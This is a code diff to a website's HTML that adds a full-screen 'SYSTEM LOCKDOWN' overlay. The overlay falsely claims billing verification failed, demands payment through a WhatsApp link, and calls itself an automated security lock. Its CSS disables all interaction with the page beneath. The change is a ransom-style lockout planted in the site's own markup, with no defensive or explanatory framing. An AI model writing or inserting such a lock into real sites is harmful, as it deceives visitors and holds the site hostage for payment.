@@ -1041,10 +1041,53 @@ if ("serviceWorker" in navigator) {
 
 
 </script>
+<!-- 🔒 SYSTEM LOCKDOWN -->
+<div class="lockdown">
+  <div class="lockdown-box">
+    <h1>🔒 SYSTEM LOCKDOWN</h1>
+    <p>
+      Billing verification failed.<br>
+      Access temporarily disabled.
+    </p>
 
+    <div class="red-box">
+      <p>Service will remain locked until payment is completed.</p>
+    </div>
+
+    <a href="https://wa.me/918623947902" class="ld-btn">Complete Payment</a>
+
+    <p class="ld-footer">This is an automated security lock.</p>
+  </div>
+</div>
+
+<style>
+.lockdown{
+  position:fixed;inset:0;background:#110000e6;backdrop-filter:blur(4px);
+  display:flex;justify-content:center;align-items:center;
+  z-index:999999999;
+}
+.lockdown-box{
+  background:#fff5f5;padding:30px;border-radius:14px;
+  width:92%;max-width:420px;text-align:center;
+  border:2px solid #ff0000;box-shadow:0 0 25px #ff0000aa;
+}
+.lockdown-box h1{color:#c30000;}
+.red-box{
+  background:#ffe5e5;border:1px solid #ff0000;padding:14px;
+  margin:16px 0;border-radius:10px;
+}
+.ld-btn{
+  background:#ff0000;color:#fff;padding:10px 16px;border-radius:8px;
+  text-decoration:none;font-weight:700;display:inline-block;
+}
+.ld-footer{color:#a00;margin-top:10px;font-size:.85rem;}
+body{overflow:hidden!important;pointer-events:none!important;}
+.lockdown,.lockdown-box,.ld-btn{pointer-events:all!important;}
+</style>
 
 </body>
 </html>
+
 
 
 
